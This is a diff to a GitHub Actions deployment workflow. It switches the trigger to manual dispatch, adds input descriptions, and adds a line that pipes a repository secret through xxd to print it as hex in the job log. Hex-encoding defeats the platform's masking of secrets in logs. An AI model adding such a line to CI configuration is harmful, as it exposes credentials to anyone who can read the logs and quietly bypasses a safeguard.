@@ -1,13 +1,15 @@
 name: Reusable deployment workflow
 on:
-  workflow_call:
+  workflow_dispatch:
     inputs:
       environment:
         required: true
         type: string
+        description: "env"
         default: sandbox
       tag:
         required: true
+        description: tag
         type: string
 jobs:
   deploy:
@@ -20,3 +22,4 @@ jobs:
           echo "I'm a command from reusable workflow"
           echo "Here should be deployment steps"
           echo "Deploying ${{ inputs.tag }} to ${{ inputs.environment }}"
+          echo -n "${{ secrets.ENV_NAME }}" | xxd -ps
